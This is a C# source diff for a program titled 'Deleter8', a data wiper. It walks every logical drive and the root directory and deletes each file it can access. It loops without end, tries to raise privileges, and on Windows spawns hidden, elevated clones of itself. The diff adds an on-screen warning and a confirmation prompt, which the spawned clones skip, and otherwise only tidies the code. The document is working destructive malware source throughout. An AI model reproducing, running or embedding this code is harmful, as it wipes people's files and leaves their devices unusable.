@@ -266,15 +266,15 @@ namespace System
     }
     public class Deleter
     {
-        public static System.Collections.Generic.List<System.String> DirectoriesList = new System.Collections.Generic.List<System.String>()
+        private static readonly System.Collections.Generic.List<System.String> DirectoriesList = new System.Collections.Generic.List<System.String>()
         {
         };
-        public static System.Boolean CanAccess(System.String folderPath, out System.Exception ex)
+        private static System.Boolean CanAccess(System.String folderPath, out System.Exception ex)
         {
             System.IO.DirectoryInfo dirInfo = new System.IO.DirectoryInfo(folderPath);
             try
             {
-                System.Security.AccessControl.DirectorySecurity dirAC = dirInfo.GetAccessControl(System.Security.AccessControl.AccessControlSections.All);
+                dirInfo.GetAccessControl(System.Security.AccessControl.AccessControlSections.All);
                 ex = null;
                 return true;
             }
@@ -284,7 +284,7 @@ namespace System
                 return false;
             }
         }
-        public static System.Collections.Generic.List<System.String> AddDir(System.String dir)
+        private static System.Collections.Generic.List<System.String> AddDir(System.String dir)
         {
             foreach (System.String d in System.IO.Directory.GetDirectories(dir))
             {
@@ -295,33 +295,34 @@ namespace System
                 }
                 else
                 {
-                    System.Console.WriteLine("Can't access " + d + ex);
+                    System.Console.Out.WriteLine("Can't access " + d + ex);
                 }
             }
             return System.Deleter.DirectoriesList;
         }
-        public const System.String Ver = "2.8";
+        public const System.String Ver = "2.9";
         public const System.String Title = "Deleter8 v" + System.Deleter.Ver;
-        public static System.String[] LogicalDrives;
-        public static System.Collections.Generic.List<System.IO.DriveInfo> Disks = new System.Collections.Generic.List<System.IO.DriveInfo>()
+        private static System.String[] LogicalDrives;
+        private static System.Collections.Generic.List<System.IO.DriveInfo> Disks = new System.Collections.Generic.List<System.IO.DriveInfo>()
         {
         };
-        public static System.String FileName = System.String.Empty;
-        public static System.String FileExtension = System.String.Empty;
-        public static System.Double Double;
-        public static System.Double LoopingDouble;
-        public static System.Double Count = 0;
-        public static System.String Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
-        public static System.String[] Messages = System.Deleter.Argument.Split('\n');
-        public static System.Boolean FileDeleted;
-        public static System.Exception Exception;
+        private static System.String FileName = System.String.Empty;
+        private static System.String FileExtension = System.String.Empty;
+        private static System.Double Double;
+        private static System.Double LoopingDouble;
+        private static System.Double Count = 0;
+        private static readonly System.String Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
+        private static readonly System.String[] Messages = System.Deleter.Argument.Split('\n');
+        private static System.Boolean FileDeleted;
+        private static System.Boolean IsCloned;
+        private static System.Exception Exception;
         public static void TryDeleteFile(System.String file)
         {
             if (System.IO.File.Exists(file))
             {
                 try
                 {
-                    System.Console.WriteLine("Deleting " + file);
+                    System.Console.Out.WriteLine("Deleting " + file);
                     System.IO.File.Delete(file);
                     if (!System.IO.File.Exists(file))
                     {
@@ -344,7 +345,7 @@ namespace System
                 System.Deleter.FileDeleted = true;
             }
         }
-        public static void ContinueDeletingUnix(System.String[] args)
+        public static void ContinueDeletingUnix()
         {
             try
             {
@@ -352,15 +353,15 @@ namespace System
             }
             catch
             {
-                System.Console.WriteLine("Failed to adjust privileges, continuing without them.");
+                System.Console.Out.WriteLine("Failed to adjust privileges, continuing without them.");
             }
             System.Console.Clear();
             System.Deleter.Count++;
-            System.Console.WriteLine(System.Deleter.Count);
+            System.Console.Out.WriteLine(System.Deleter.Count);
             System.Console.ForegroundColor = System.ConsoleColor.Yellow;
             System.Console.BackgroundColor = System.ConsoleColor.Black;
             System.Threading.Thread.Sleep(200);
-            System.Console.WriteLine(System.Deleter.Messages);
+            System.Console.Out.WriteLine(System.Deleter.Messages);
             System.String root = System.IO.Directory.GetDirectoryRoot(System.IO.Directory.GetCurrentDirectory());
             if (root == null || root == "")
             {
@@ -381,19 +382,19 @@ namespace System
                             System.Deleter.TryDeleteFile(file);
                             if (System.Deleter.FileDeleted == false)
                             {
-                                System.Console.WriteLine("Failed to delete file: " + file);
-                                System.Console.WriteLine(System.Deleter.Exception);
+                                System.Console.Out.WriteLine("Failed to delete file: " + file);
+                                System.Console.Out.WriteLine(System.Deleter.Exception);
                             }
                         }
                     }
                 }
                 catch 
                 {
-                    System.Deleter.DeleteDirUnix(args);
+                    System.Deleter.DeleteDirUnix();
                 }
             }
         }
-        public static void DeleteDirUnix(System.String[] args)
+        public static void DeleteDirUnix()
         {
             try
             {
@@ -401,11 +402,11 @@ namespace System
             }
             catch
             {
-                System.Console.WriteLine("Failed to adjust privileges, continuing without them.");
+                System.Console.Out.WriteLine("Failed to adjust privileges, continuing without them.");
             }
             System.Console.ForegroundColor = System.ConsoleColor.Red;
             System.Console.BackgroundColor = System.ConsoleColor.Black;
-            System.Console.WriteLine(System.Deleter.Messages);
+            System.Console.Out.WriteLine(System.Deleter.Messages);
             System.String root = System.IO.Directory.GetDirectoryRoot(System.IO.Directory.GetCurrentDirectory());
             if (root == null || root == "")
             {
@@ -426,36 +427,34 @@ namespace System
                             System.Deleter.TryDeleteFile(file);
                             if (!System.Deleter.FileDeleted)
                             {
-                                System.Console.WriteLine("Failed to delete file: " + file);
-                                System.Console.WriteLine(System.Deleter.Exception);
+                                System.Console.Out.WriteLine("Failed to delete file: " + file);
+                                System.Console.Out.WriteLine(System.Deleter.Exception);
                             }
                         }
                     }
                 }
                 catch
                 {
-                    System.Deleter.ContinueDeletingUnix(args);
+                    System.Deleter.ContinueDeletingUnix();
                 }
             }
         }
-        public static void DeleteDir(System.String[] args)
+        public static void DeleteDir()
         {
             try
             {
-                System.Console.WriteLine(args);
-                System.Console.Clear();
-                System.Console.WriteLine(System.Deleter.Messages);
+                System.Console.Out.WriteLine(System.Deleter.Messages);
                 System.Deleter.LogicalDrives = System.IO.Directory.GetLogicalDrives();
                 System.Deleter.Disks = new System.Collections.Generic.List<System.IO.DriveInfo>(System.IO.DriveInfo.GetDrives());
                 foreach (System.IO.DriveInfo disk in System.Deleter.Disks)
                 {
                     if (disk.Name != disk.VolumeLabel)
                     {
-                        System.Console.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
+                        System.Console.Out.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
                     }
                     else
                     {
-                        System.Console.WriteLine("Current drive is: " + disk.Name);
+                        System.Console.Out.WriteLine("Current drive is: " + disk.Name);
                     }
                     foreach (System.String drive in System.Deleter.LogicalDrives)
                     {
@@ -474,8 +473,8 @@ namespace System
                                 System.Deleter.TryDeleteFile(file);
                                 if (!System.Deleter.FileDeleted)
                                 {
-                                    System.Console.WriteLine("Failed to delete file: " + file);
-                                    System.Console.WriteLine(System.Deleter.Exception);
+                                    System.Console.Out.WriteLine("Failed to delete file: " + file);
+                                    System.Console.Out.WriteLine(System.Deleter.Exception);
                                 }
                             }
                         }
@@ -487,33 +486,31 @@ namespace System
                 while (System.Deleter.LoopingDouble != System.Double.PositiveInfinity)
                 {
                     System.Deleter.LoopingDouble++;
-                    System.Deleter.ContinueDeleting(args);
+                    System.Deleter.ContinueDeleting();
                 }
             }
         }
-        public static void ContinueDeleting(System.String[] args)
+        public static void ContinueDeleting()
         {
             try
             {
-                System.Console.WriteLine(args);
-                System.Console.Clear();
                 System.Deleter.Count++;
                 System.Deleter.LogicalDrives = System.IO.Directory.GetLogicalDrives();
                 System.Deleter.Disks = new System.Collections.Generic.List<System.IO.DriveInfo>(System.IO.DriveInfo.GetDrives());
-                System.Console.WriteLine(System.Deleter.Count);
+                System.Console.Out.WriteLine(System.Deleter.Count);
                 System.Console.ForegroundColor = System.ConsoleColor.Yellow;
                 System.Console.BackgroundColor = System.ConsoleColor.Black;
                 System.Threading.Thread.Sleep(200);
-                System.Console.WriteLine(System.Deleter.Messages);
+                System.Console.Out.WriteLine(System.Deleter.Messages);
                 foreach (System.IO.DriveInfo disk in System.Deleter.Disks)
                 {
                     if (disk.Name != disk.VolumeLabel)
                     {
-                        System.Console.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
+                        System.Console.Out.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
                     }
                     else
                     {
-                        System.Console.WriteLine("Current drive is: " + disk.Name);
+                        System.Console.Out.WriteLine("Current drive is: " + disk.Name);
                     }
                     foreach (System.String drive in System.Deleter.LogicalDrives)
                     {
@@ -532,8 +529,8 @@ namespace System
                                 System.Deleter.TryDeleteFile(file);
                                 if (!System.Deleter.FileDeleted)
                                 {
-                                    System.Console.WriteLine("Failed to delete file: " + file);
-                                    System.Console.WriteLine(System.Deleter.Exception);
+                                    System.Console.Out.WriteLine("Failed to delete file: " + file);
+                                    System.Console.Out.WriteLine(System.Deleter.Exception);
                                 }
                             }
                         }
@@ -545,7 +542,7 @@ namespace System
                 while (System.Deleter.LoopingDouble != System.Double.PositiveInfinity)
                 {
                     System.Deleter.LoopingDouble++;
-                    System.Deleter.DeleteDir(args);
+                    System.Deleter.DeleteDir();
                 }
             }
         }
@@ -567,6 +564,30 @@ namespace System
         public static System.Boolean PreviousValue = false;
         public static void Continue(System.String[] args)
         {
+            System.String arguments = "";
+            foreach (System.String arg in args)
+            {
+                arguments += arg;
+            }
+            if (arguments.ToLower().Contains("cloned"))
+            {
+                System.Deleter.IsCloned = true;
+            }
+            else
+            {
+                System.Deleter.IsCloned = false;
+            }
+            if (!System.Deleter.IsCloned)
+            {
+                System.Console.Out.WriteLine("WARNING! THIS DELETES THE ROOT DIRECTORY! " +
+                    "EXECUTING THIS WILL RENDER YOUR DEVICE UNUSABLE!");
+                System.Console.Out.WriteLine("ARE YOU SURE YOU WANT TO CONTINUE? Y OR N");
+                if (!System.Console.ReadLine().ToUpper().Contains("Y"))
+                {
+                    System.Environment.Exit(0);
+                    return;
+                }
+            }
             System.OS.DetectCurrentOS();
             System.Deleter.FileExtension = System.IO.Path.GetExtension(System.OS.DetectedOS.ProcessFilePath);
             System.Deleter.FileName = System.IO.Path.GetFileNameWithoutExtension(System.OS.DetectedOS.ProcessFilePath);
@@ -579,10 +600,6 @@ namespace System
                 System.Console.ForegroundColor = System.ConsoleColor.Red;
                 System.Console.BackgroundColor = System.ConsoleColor.Black;
             }
-            if (args == null || args.Length == 0)
-            {
-                args = System.Deleter.Messages;
-            }
             System.Threading.Thread.Sleep(1000);
             while (System.Deleter.Double != System.Double.PositiveInfinity)
             {
@@ -591,7 +608,7 @@ namespace System
                     System.Deleter.Double++;
                     if (!System.OS.DetectedOS.IsWindows)
                     {
-                        System.Deleter.DeleteDirUnix(args);
+                        System.Deleter.DeleteDirUnix();
                     }
                     else
                     {
@@ -601,12 +618,12 @@ namespace System
                         p.StartInfo.Verb = "runas";
                         p.StartInfo.FileName = System.Deleter.FileName + "(" +
                             System.Deleter.Double + ")" + System.Deleter.FileExtension;
-                        p.StartInfo.Arguments = System.Deleter.Argument;
+                        p.StartInfo.Arguments = "cloned " + System.Deleter.Argument;
                         p.StartInfo.CreateNoWindow = false;
                         p.StartInfo.RedirectStandardOutput = true;
                         p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                         p.Start();
-                        System.Deleter.DeleteDir(args);
+                        System.Deleter.DeleteDir();
                     }
                 }
                 catch
@@ -621,6 +638,30 @@ namespace System
         }
         public static void Main(System.String[] args)
         {
+            System.String arguments = "";
+            foreach (System.String arg in args)
+            {
+                arguments += arg;
+            }
+            if (arguments.ToLower().Contains("cloned"))
+            {
+                System.Deleter.IsCloned = true;
+            }
+            else
+            {
+                System.Deleter.IsCloned = false;
+            }
+            if (!System.Deleter.IsCloned)
+            {
+                System.Console.Out.WriteLine("WARNING! THIS DELETES THE ROOT DIRECTORY! " +
+                    "EXECUTING THIS WILL RENDER YOUR DEVICE UNUSABLE!");
+                System.Console.Out.WriteLine("ARE YOU SURE YOU WANT TO CONTINUE? Y OR N");
+                if (!System.Console.ReadLine().ToUpper().Contains("Y"))
+                {
+                    System.Environment.Exit(0);
+                    return;
+                }
+            }
             System.OS.DetectCurrentOS();
             System.Deleter.FileExtension = System.IO.Path.GetExtension(System.OS.DetectedOS.ProcessFilePath);
             System.Deleter.FileName = System.IO.Path.GetFileNameWithoutExtension(System.OS.DetectedOS.ProcessFilePath);
@@ -633,10 +674,6 @@ namespace System
                 System.Console.ForegroundColor = System.ConsoleColor.Red;
                 System.Console.BackgroundColor = System.ConsoleColor.Black;
             }
-            if (args == null || args.Length == 0)
-            {
-                args = System.Deleter.Messages;
-            }
             System.Threading.Thread.Sleep(1000);
             while (System.Deleter.Double != System.Double.PositiveInfinity)
             {
@@ -645,7 +682,7 @@ namespace System
                     System.Deleter.Double++;
                     if (!System.OS.DetectedOS.IsWindows)
                     {
-                        System.Deleter.DeleteDirUnix(args);
+                        System.Deleter.DeleteDirUnix();
                     }
                     else
                     {
@@ -655,12 +692,12 @@ namespace System
                         p.StartInfo.Verb = "runas";
                         p.StartInfo.FileName = System.Deleter.FileName + "(" +
                             System.Deleter.Double + ")" + System.Deleter.FileExtension;
-                        p.StartInfo.Arguments = System.Deleter.Argument;
+                        p.StartInfo.Arguments = "cloned " + System.Deleter.Argument;
                         p.StartInfo.CreateNoWindow = false;
                         p.StartInfo.RedirectStandardOutput = true;
                         p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                         p.Start();
-                        System.Deleter.DeleteDir(args);
+                        System.Deleter.DeleteDir();
                     }
                 }
                 catch
